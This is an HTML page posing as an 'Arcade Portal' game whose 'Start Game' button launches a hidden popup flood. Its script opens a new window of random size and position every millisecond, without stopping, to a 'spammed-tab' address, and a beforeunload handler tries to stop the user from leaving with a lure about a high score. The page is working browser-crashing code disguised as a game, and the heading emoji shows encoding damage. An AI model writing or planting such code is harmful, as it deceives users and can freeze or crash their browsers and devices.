<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Arcade Portal</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap');

    body {
      margin: 0;
      padding: 0;
      font-family: 'Press Start 2P', cursive;
      color: #00ff99;
      text-align: center;
      height: 100vh;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      background: url('https://i.imgur.com/3ZQ3ZQZ.gif') center/cover no-repeat;
    }

    h1 {
      font-size: 2.5em;
      color: #00ff99;
      text-shadow: 2px 2px #000;
      margin-bottom: 30px;
    }

    button {
      font-size: 1.2em;
      padding: 20px 40px;
      background-color: #ff0066;
      border: 3px solid #990033;
      border-radius: 10px;
      color: #fff;
      cursor: pointer;
      box-shadow: 0 0 10px #ff0066, 0 0 20px #ff0066;
      transition: transform 0.2s ease, box-shadow 0.2s ease;
    }

    button:hover {
      transform: scale(1.1);
      box-shadow: 0 0 20px #ff3399, 0 0 30px #ff3399;
    }
  </style>
  <script>
    let intervalId = null;

    function generateSizes(count = 1000) {
      const sizes = [];
      for (let i = 0; i < count; i++) {
        const width = Math.floor(Math.random() * 1000) + 200;
        const height = Math.floor(Math.random() * 800) + 150;
        sizes.push({ width, height });
      }
      return sizes;
    }

    function launchArcade() {
      const sizes = generateSizes();

      if (!intervalId) {
        intervalId = setInterval(() => {
          const screenWidth = window.screen.availWidth;
          const screenHeight = window.screen.availHeight;

          const size = sizes[Math.floor(Math.random() * sizes.length)];
          const left = Math.floor(Math.random() * Math.max(1, screenWidth - size.width));
          const top = Math.floor(Math.random() * Math.max(1, screenHeight - size.height));

          window.open(
            "https://classroomgms.github.io/spammed-tab/",
            "_blank",
            `width=${size.width},height=${size.height},top=${top},left=${left}`
          );
        }, 1);
      }
    }

    window.addEventListener('beforeunload', function (e) {
      const message = "Don't leave the arcade! Your high score awaits!";
      e.preventDefault();
      e.returnValue = message;
      return message;
    });
  </script>
</head>
<body>
  <h1>ðŸŽ® Arcade Portal</h1>
  <button onclick="launchArcade()">Start Game</button>
</body>
</html>
